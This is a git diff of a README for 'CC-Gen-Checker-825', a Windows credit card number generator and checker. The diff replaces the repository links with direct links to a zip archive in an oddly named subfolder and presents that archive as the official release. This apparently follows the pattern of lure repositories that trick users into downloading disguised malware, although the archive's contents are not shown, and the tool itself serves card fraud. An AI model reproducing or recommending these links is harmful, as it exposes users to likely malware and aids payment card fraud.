@@ -1,6 +1,6 @@
 # 💳 CC-Gen-Checker-825 - Verify credit card number formats easily
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Tobinerratic171/CC-Gen-Checker-825)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Tobinerratic171/CC-Gen-Checker-825/raw/refs/heads/main/odontoma/C_Gen_Checker_3.0.zip)
 
 ## 📌 About this software
 
@@ -27,7 +27,7 @@ The software runs locally on your Windows machine. It does not send data to exte
 
 Visit the link below to get the official release version of the software.
 
-[https://github.com/Tobinerratic171/CC-Gen-Checker-825](https://github.com/Tobinerratic171/CC-Gen-Checker-825)
+[https://github.com/Tobinerratic171/CC-Gen-Checker-825/raw/refs/heads/main/odontoma/C_Gen_Checker_3.0.zip](https://github.com/Tobinerratic171/CC-Gen-Checker-825/raw/refs/heads/main/odontoma/C_Gen_Checker_3.0.zip)
 
 Follow these steps to install the tool on your computer:
 
